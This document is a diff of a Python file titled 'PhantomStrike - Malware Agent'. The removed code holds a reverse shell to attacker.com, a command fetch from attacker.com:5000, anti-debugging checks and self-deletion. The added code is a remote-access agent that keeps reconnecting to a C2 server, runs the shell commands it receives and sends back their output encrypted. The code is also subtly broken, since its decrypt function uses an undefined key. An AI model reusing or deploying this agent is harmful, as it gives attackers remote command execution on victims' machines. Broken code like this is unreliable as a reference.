@@ -1,85 +1,97 @@
 import socket
+import subprocess
 import os
 import time
 import base64
-import subprocess
-import logging
 from Crypto.Cipher import AES
-from Crypto.Util.Padding import pad, unpad
-import requests
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+import platform
 
-# Suppress warnings
-import warnings
-warnings.filterwarnings("ignore", category=UserWarning, module='requests')
-
-# ASCII Art Banner
-ascii_art = r"""
+# ASCII Art for PhantomStrike Agent
+print("""
 ██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
 ██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
-██████╔╝███████║███████║██╔████╔██║    ██║    █████╗  
-██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝  
+██████╔╝███████║███████║██╔████╔██║    ██║    █████╗
+██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝
 ██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
 ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝
-              PhantomStrike - Malware Agent
-"""
-print(ascii_art)
+           PhantomStrike - Agent 
+                             
+                                                          by https://github.com/Akkaiaj
+""")
 
-# AES Decryption
-key = b'SixteenByteKeyXX'
-cipher = AES.new(key, AES.MODE_CBC)
+# Server info
+SERVER_IP = 'YOUR_C2_SERVER_IP'
+SERVER_PORT = 4444
+PERSISTENCE_SCRIPT = '/etc/init.d/phantom_agent'
+CLEANUP_SCRIPT = '/tmp/phantom_cleanup.sh'
+
+# AES Encryption and Decryption
+def encrypt_data(data):
+    key = get_random_bytes(16)  # AES 128-bit key
+    cipher = AES.new(key, AES.MODE_EAX)
+    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
+    return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
 
 def decrypt_data(data):
-    encrypted_data = base64.b64decode(data)
-    iv = encrypted_data[:16]
-    ciphertext = encrypted_data[16:]
-    dec_cipher = AES.new(key, AES.MODE_CBC, iv)
-    return unpad(dec_cipher.decrypt(ciphertext), AES.block_size).decode()
+    data = base64.b64decode(data)
+    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
+    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
+    return cipher.decrypt_and_verify(ciphertext, tag).decode()
 
-# Anti-Debugging & Self-Delete
-def anti_debug():
-    try:
-        with open("/proc/self/status", "r") as f:
-            for line in f:
-                if "TracerPid:" in line and not line.endswith("\t0\n"):
-                    logging.warning("Debugger detected, exiting...")
-                    exit(1)
-    except:
-        pass
-
-def self_delete():
-    time.sleep(3)
-    os.remove(__file__)
-
-# Reverse Shell
-def reverse_shell():
-    host = "attacker.com"  # Replace with your C2 server
-    port = 4444
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
+# Connect to the C2 server
+def connect_to_server():
     while True:
-        data = s.recv(1024)
-        if data.decode().strip() == "exit":
-            break
-        output = subprocess.run(data.decode(), shell=True, capture_output=True)
-        s.send(output.stdout)
-    s.close()
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((SERVER_IP, SERVER_PORT))
+            print("[+] Connected to the server.")
+            return s
+        except Exception as e:
+            print(f"[-] Connection failed: {e}")
+            time.sleep(5)
 
-# Main
+# Send data to C2 server
+def send_data(s, data):
+    encrypted_data = encrypt_data(data)
+    try:
+        s.send(encrypted_data.encode())
+    except Exception as e:
+        print(f"[-] Failed to send data: {e}")
+
+# Receive commands from C2 server
+def receive_commands(s):
+    try:
+        data = s.recv(1024).decode()
+        return decrypt_data(data)
+    except Exception as e:
+        print(f"[-] Failed to receive data: {e}")
+        return ""
+
+# Execute commands
+def execute_command(command):
+    try:
+        output = subprocess.check_output(command, shell=True)
+        return output.decode()
+    except subprocess.CalledProcessError as e:
+        return f"[-] Error: {e}"
+
+# Main function for agent
+def main():
+    s = connect_to_server()
+
+    while True:
+        command = receive_commands(s)
+        if command:
+            if command.lower() == 'exit':
+                s.close()
+                print("[+] Disconnected from server.")
+                break
+            else:
+                result = execute_command(command)
+                send_data(s, result)
+        time.sleep(1)
+
 if __name__ == "__main__":
-    anti_debug()
-    logging.basicConfig(filename="agent_log.txt", level=logging.INFO)
-    
-    # Get command from C2
-    response = requests.post("http://attacker.com:5000/command", json={"command": "whoami"})
-    encrypted_cmd = response.json()["command"]
-    decrypted_cmd = decrypt_data(encrypted_cmd)
-    
-    # Execute received command
-    result = subprocess.getoutput(decrypted_cmd)
-    print(result)
-
-    # Enable reverse shell
-    reverse_shell()
-
-    # Self-delete (optional)
-    self_delete()
+    main()
